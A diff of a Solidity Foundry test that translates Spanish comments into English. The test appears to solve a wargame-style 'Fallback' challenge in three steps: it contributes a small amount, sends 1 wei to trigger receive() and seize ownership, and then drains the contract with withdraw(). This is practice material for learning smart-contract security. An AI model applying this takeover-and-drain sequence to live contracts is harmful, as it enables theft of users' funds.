@@ -9,42 +9,41 @@ contract FallbackExploit is Test {
     address attacker = makeAddr("attacker");
 
     function setUp() public {
-        // Desplegamos el contrato víctima. El deployer (este test) es el owner inicial.
+        // Deploy the victim contract. The deployer (this test) is the initial owner.
         target = new Fallback();
-        // Le damos algo de ETH al contrato para que haya algo que robar
+        // Give the contract some ETH so there is something to steal.
         vm.deal(address(target), 5 ether);
-        // Le damos fondos al atacante para operar
+        // Fund the attacker.
         vm.deal(attacker, 1 ether);
     }
 
     function test_TakeOwnershipAndDrain() public {
-        // Nos ponemos en la piel del atacante para toda la secuencia
+        // Act as the attacker for the whole sequence.
         vm.startPrank(attacker);
 
-        // Estado inicial: el atacante NO es owner
-        assertTrue(target.owner() != attacker, "atacante no deberia ser owner aun");
+        // Initial state: attacker is not the owner.
+        assertTrue(target.owner() != attacker, "attacker should not be owner yet");
 
-        // ── PASO 1: contribuir un poquito para que contributions[attacker] > 0 ──
+        // STEP 1: contribute a tiny amount so contributions[attacker] > 0
         target.contribute{value: 0.0005 ether}();
-        assertGt(target.getContribution(), 0, "la contribucion debe ser > 0");
+        assertGt(target.getContribution(), 0, "contribution must be > 0");
 
-        // ── PASO 2: mandar ETH directo → activa receive() → nos hace owner ──
+        // STEP 2: send ETH directly -> triggers receive() -> makes us owner
         (bool ok, ) = address(target).call{value: 1 wei}("");
-        require(ok, "el envio directo fallo");
+        require(ok, "direct send failed");
 
-        // Verificamos que el exploit funcionó: ahora el atacante es owner
-        assertEq(target.owner(), attacker, "el atacante deberia ser el nuevo owner");
+        // Verify the exploit worked: attacker is now owner.
+        assertEq(target.owner(), attacker, "attacker should be the new owner");
 
-        // ── PASO 3: como owner, vaciamos el balance del contrato ──
-        uint256 balanceAntes = attacker.balance;
+        // STEP 3: as owner, drain the contract balance.
+        uint256 balanceBefore = attacker.balance;
         target.withdraw();
 
-        // El contrato quedó en cero y el atacante se llevó todo
-        assertEq(address(target).balance, 0, "el contrato deberia quedar vacio");
-        assertGt(attacker.balance, balanceAntes, "el atacante deberia tener mas ETH");
+        assertEq(address(target).balance, 0, "contract should be empty");
+        assertGt(attacker.balance, balanceBefore, "attacker should have more ETH");
 
         vm.stopPrank();
 
-        console.log("Exploit exitoso: atacante tomo ownership y vacio el contrato");
+        console.log("Exploit successful: attacker took ownership and drained the contract");
     }
 }
